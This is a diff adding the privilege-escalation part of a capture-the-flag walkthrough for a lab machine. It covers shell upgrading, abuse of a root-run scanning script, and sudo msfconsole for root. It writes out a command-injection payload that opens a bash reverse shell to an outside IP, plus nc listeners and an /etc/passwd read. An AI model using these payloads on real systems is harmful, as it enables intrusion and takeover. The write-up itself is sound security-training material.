@@ -13,6 +13,11 @@
   * [CVE-2020-7384: Msfvenom APK Template Command Injection](#cve-2020-7384-msfvenom-apk-template-command-injection)
   * [Getting the User Flag](#getting-the-user-flag)
 * Root
+  * [Getting Fully Interactive Shell](#getting-fully-interactive-shell)
+  * [`pwn` user](#pwn-user)
+  * [`scanlosers.sh`](#scanloserssh)
+  * [`pwn` Reverse Shell](#pwn-reverse-shell)
+  * [Getting the Root Flag](#getting-the-root-flag)
 
 ## Walkthrough
 
@@ -125,3 +130,108 @@ Set up a listener with `nc -nlvp 4444` and click on `generate` on the website.
 Now, we should get a reverse shell on the remote machine as user `kid`. 
 
 ![user flag](images/4.png)
+
+### Getting Fully Interactive Shell
+NOTE: to do the following steps make sure to use bash instead of zsh, which is the default shell of the newer version of kali linux.
+
+Once we have got the user shell, we can try to [upgrade the shell to a fully interactive shell](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/). This is done to prevent accidentally killing the reverse shell connection and spawning weird characters when clicking the arrow keys.
+
+Firstly, we spawn a pseudo-terminal with python then background the shell with `Control+Z`.
+```
+kid@scriptkiddie:~/html$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+kid@scriptkiddie:~/html$ ^Z
+[1]+  Stopped                 nc -nlvp 4444
+```
+
+Next, get info of our terminal. Take note of $TERM, rows and columns.
+```
+$ echo $TERM
+xterm-256color
+$ stty -a
+speed 38400 baud; rows 47; columns 177; line = 0;
+intr = ^C; quit = ^\; erase = ^H; kill = ^U; eof = ^D; eol = <undef>; eol2 = <undef>; swtch = <undef>; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W; lnext = ^V;
+discard = ^O; min = 1; time = 0;
+-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts
+-ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl -ixon -ixoff -iuclc -ixany -imaxbel iutf8
+opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0
+isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc
+```
+
+Finally, make the terminal pass through keyboard shortcuts and so on with `$ stty raw -echo` and then foreground the terminal with `fg`. Then, set up the SHELL and TERM environment variables along with the rows & columns of the terminal to match our own.
+```
+$ stty raw -echo
+$ fg
+kid@scriptkiddie:~/html$ export SHELL=bash
+kid@scriptkiddie:~/html$ export TERM=xterm-256color
+kid@scriptkiddie:~/html$ stty rows 47 columns 177
+```
+### `pwn` user
+
+Reading the `/etc/passwd` file tells us that there is another user in the machine, which is `pwn`.
+```
+kid@scriptkiddie:~$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+
+# -- snip -- 
+
+kid:x:1000:1000:kid:/home/kid:/bin/bash
+pwn:x:1001:1001::/home/pwn:/bin/bash
+```
+
+### `scanlosers.sh`
+Looking at `pwn` home directory, we can find a script `scanlosers.sh`
+
+```
+kid@scriptkiddie:~$ cd /home/pwn
+kid@scriptkiddie:/home/pwn$ ls
+recon  scanlosers.sh
+```
+
+```
+kid@scriptkiddie:/home/pwn$ cat scanlosers.sh
+#!/bin/bash
+
+log=/home/kid/logs/hackers
+
+cd /home/pwn/
+cat $log | cut -d' ' -f3- | sort -u | while read ip; do
+    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
+done
+
+if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
+```
+
+So, the script reads the file from `/home/kid/logs/hackers`, which we can write into.
+```
+kid@scriptkiddie:/home/pwn$ ls -l /home/kid/logs/hackers
+-rw-rw-r-- 1 kid pwn 0 Feb  3 11:46 /home/kid/logs/hackers
+```
+
+Then, it will ignore the first two words with `cut -d' ' -f3-`. The `-f3-` takes the third word and anything after it from each line (this differs from `-f3`, which only takes the third word from each line).
+
+### `pwn` Reverse Shell
+What we can do is to write into `/home/kid/logs/hackers` the script that will generate a new reverse shell.
+```
+echo "  ; /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.14/5555 0>&1'; " > /home/kid/logs/hackers
+```
+
+Note that we need to insert two spaces at the beginning of our script. This will be split by `cut -d' ' -f3-` and the first two words will be an empty string. The third word onwards will be `; /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.14/5555 0>&1'; `, which will give us a new reverse shell as `pwn`.
+
+Don't forget to set a listener on port 5555 with `nc -nlvp 5555`.
+
+Next, upgrade our shell to a fully interactive shell again.
+
+### Getting the Root Flag
+Once we got the reverse shell of `pwn` user, we can try to execute `sudo -l` to determine the user's permission.
+```
+pwn@scriptkiddie:~$ sudo -l
+Matching Defaults entries for pwn on scriptkiddie:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User pwn may run the following commands on scriptkiddie:
+    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
+```
+
+In this case, we can execute `msfconsole` as root, which we can use to get the root flag.
+![root flag](images/5.png)
